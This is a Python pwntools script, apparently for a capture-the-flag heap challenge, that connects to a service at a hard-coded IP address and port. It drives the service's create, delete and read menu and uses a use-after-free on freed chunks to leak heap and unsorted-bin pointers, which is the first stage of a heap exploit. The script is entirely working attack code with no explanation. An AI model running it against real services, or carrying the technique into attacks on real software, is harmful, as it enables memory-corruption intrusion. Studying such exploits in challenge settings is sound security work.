from pwn import *
import struct, sys
context.log_level='error'
HOST='52.76.96.108'; PORT=9005
log=lambda *a: print(*a, file=sys.stderr, flush=True)

def create(p, idx, size, data):
    p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'index: ', str(idx).encode()); p.sendlineafter(b'size: ', str(size).encode()); p.sendlineafter(b'data: ', data); p.recvuntil(b'> ', timeout=3)
def delete(p, idx):
    p.sendlineafter(b'> ', b'3'); p.sendlineafter(b'index: ', str(idx).encode()); p.recvuntil(b'> ', timeout=3)
def readn(p, idx):
    p.sendlineafter(b'> ', b'4'); p.sendlineafter(b'index: ', str(idx).encode()); r=p.recvuntil(b'> ', timeout=3); i=r.find(b'data: '); return r[i+6:r.find(b'\n',i)]

p=remote(HOST,PORT); log('conn'); p.recvuntil(b'> '); log('banner')
create(p,0,0x80,b'A'*0x80); log('create0')
create(p,1,0x80,b'B'*0x80); log('create1')
delete(p,0); log('del0')
delete(p,1); log('del1')
d=readn(p,1); log('read1', d[:16].hex())
fd=struct.unpack('<Q',d[:8])[0]; log('fd',hex(fd))
create(p,2,0x500,b'C'*0x500); log('create2')
create(p,3,0x500,b'D'*0x500); log('create3')
create(p,4,0x20,b'E'*0x20); log('create4')
delete(p,2); log('del2')
d2=readn(p,2); log('readun', d2[:16].hex())
un=struct.unpack('<Q',d2[:8])[0]; log('unsorted',hex(un))
p.close(); log('close')
